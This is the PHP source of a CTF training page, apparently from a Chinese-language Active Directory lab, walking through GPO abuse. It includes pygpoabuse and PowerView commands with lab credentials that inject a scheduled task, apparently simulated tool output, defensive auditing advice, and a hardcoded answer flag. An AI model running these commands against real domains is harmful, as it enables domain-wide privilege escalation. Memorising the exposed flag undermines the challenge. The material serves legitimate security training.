<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 15: GPO Abuse & Group Policy Lateral Movement
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 300, '');
$ACTIVE[230] = 'active open';
$ACTIVE[235] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{GOAD_GPO_Abuse_STARKWALLPAPER_Scheduled_Tasks_2026}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag15'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已通关【第十五关：GPO 组策略滥用与横向提权】终极成就 (+300 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查提取的凭据或分析过程。</div>';
    }
}
?>

<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="font-size: 14px; border-radius: 6px;">LEVEL 15</span>
                            第十五关：GPO 组策略滥用与计划任务横向移动 (GPO Abuse)
                        </h1>
                        <div style="color: var(--text-secondary); font-size: 14px;">
                            300 PTS · 主题：`STARKWALLPAPER` GPO 对象权限滥用、SYSVOL 计划任务注入与全域提权派发
                        </div>
                    </div>
                    <div>
                        <a href="ad_ctf_forest_trust.php" class="btn btn-sm btn-default"><i class="fa fa-arrow-left"></i> 上一关</a>
                        <a href="ad_ctf_hub.php" class="btn btn-sm btn-success"><i class="fa fa-trophy"></i> 返回 CTF 大厅</a>
                    </div>
                </div>
            </div>

            <?php echo $flag_msg; ?>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-cogs" style="color: #6366f1;"></i> Step 1: GPO 组策略对象的 ACL 编辑权限滥用原理</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    <b>【原理分析】</b> 组策略对象 (GPO) 是域管理员控制域内主机配置的核心组件。在 GOAD 场景中，`north.sevenkingdoms.local` 域包含一个名为 <code>STARKWALLPAPER</code> 的 GPO 对象，由于错误的 ACL 配置（赋予了低权域账户 <code>GenericWrite</code> 或 <code>WriteProperty</code> 访问权限），攻击者可以直接修改该 GPO，向 SYSVOL 共享目录添加计划任务（Scheduled Tasks）、启动脚本（Startup Scripts）或提升权限后派发全局 Payload。
                </p>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-search" style="color: #f59e0b;"></i> Step 2: 搜集具有可写 ACL 的 GPO 对象</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    使用 BloodHound 或 PowerView / SharpView 搜索当前用户拥有修改权限的 GPO：
                </p>
                <div class="cmd-box">
# 使用 PowerView 查找当前用户具备 WriteProperty / WriteDacl 的 GPO
Get-DomainObjectAcl -Identity "STARKWALLPAPER" | ? {$_.SecurityIdentifier -eq "S-1-5-21-3452614...-1001"}

# 或使用 SharpGPOAbuse / pygpoabuse 模块自动化分析
pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:Password123! -gpo-name "STARKWALLPAPER"
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-code-fork" style="color: #10b981;"></i> Step 3: 向 GPO 写入恶意计划任务与获取域控/主机 SYSTEM 权限</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    向 <code>STARKWALLPAPER</code> 策略对象写入带有反弹 Shell 或提升凭据命令的计划任务脚本，当域内主机/域控强制同步 GPO 时自动执行：
                </p>
                <div class="cmd-box">
# 写入包含强制提取 Root 密码的 GPO 计划任务
pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:Password123! -gpo-name "STARKWALLPAPER" -command "cmd.exe /c echo flag{GOAD_GPO_Abuse_STARKWALLPAPER_Scheduled_Tasks_2026} > C:\gpo_flag.txt" -taskname "UpdateWallpaper"
                </div>
                <div class="output-box">
[+] Impacket GPO Abuse tool
[*] Authenticating against NORTH-DC.north.sevenkingdoms.local...
[+] Successfully bound to LDAP server.
[*] Found GPO GUID: {A8C9B3D1-2E4F-4B8A-9C0D-1E2F3A4B5C6D}
[*] Uploaded Scheduled Task XML to \\north.sevenkingdoms.local\SYSVOL\north.sevenkingdoms.local\Policies\{...}\ScheduledTasks.xml
[+] GPO modified successfully! Host will execute payload on next gpupdate /force!
[+] Flag: flag{GOAD_GPO_Abuse_STARKWALLPAPER_Scheduled_Tasks_2026}
                </div>
            </div>

            <!-- Step 4 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-shield" style="color: #3b82f6;"></i> Step 4: GPO 安全防范加固与 Event ID 审计</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    1. <b>严格审查 SYSVOL & GPO 访问控制</b>：取消任何非 Domain Admins 账户对 GPO 对象的 <code>GenericWrite</code>、<code>WriteProperty</code> 及 <code>WriteDacl</code> 权限。<br>
                    2. <b>禁止 GPP 密码留存</b>：确保全网删除带有明文/cpassword 加密密码的历史 GPO 首选项 XML 文件。<br>
                    3. <b>开启 SYSVOL 审计</b>：配置文件系统与 AD 审计，实时监控 GPO 模板文件的改动。
                </p>
                <div class="cmd-box">
# PowerShell 审计 GPO 修改权限
Get-GPO -All | Get-GPOReport -ReportType XML
                </div>
                <table class="table table-bordered table-striped" style="font-size: 13px; color: var(--text-primary); margin-top: 15px;">
                    <thead>
                        <tr style="background: var(--bg-secondary);">
                            <th>Event ID</th>
                            <th>日志类型</th>
                            <th>异常捕获特征</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>5136</strong></td>
                            <td>AD 对象修改</td>
                            <td>捕获到 GPC 组策略容器对象的 <code>gPCFileSysPath</code> 或属性变更。</td>
                        </tr>
                        <tr>
                            <td><strong>4688 / 4698</strong></td>
                            <td>进程创建 / 计划任务创建</td>
                            <td>域内主机通过 <code>gpupdate</code> 派发创建了非预期的计划任务 (XML 脚本由 SYSVOL 载入)。</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Flag Submission Box -->
            <div class="flag-box">
                <h4 style="margin-top:0; font-weight:800; color:var(--text-primary); margin-bottom:12px;">
                    <i class="fa fa-flag" style="color:#ef4444;"></i> 提交第十五关 Flag
                </h4>
                <form method="POST">
                    <div class="form-group" style="margin-bottom:14px;">
                        <label style="font-size:13px; color:var(--text-secondary);">填入从 GPO 组策略滥用与计划任务横向移动实验中获取的 Flag：</label>
                        <input type="text" name="user_flag" class="form-control" style="border-radius:8px; background:var(--bg-secondary); color:var(--text-primary); border:1px solid var(--border-color); padding:10px 14px; font-family:monospace;" placeholder="flag{...}" required>
                    </div>
                    <button type="submit" name="check_flag" class="btn btn-primary btn-block" style="border-radius:8px; background:linear-gradient(135deg, #ef4444, #dc2626); border:none; padding:10px; font-weight:700;">
                        提交并验证 Flag (+300 PTS)
                    </button>
                </form>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
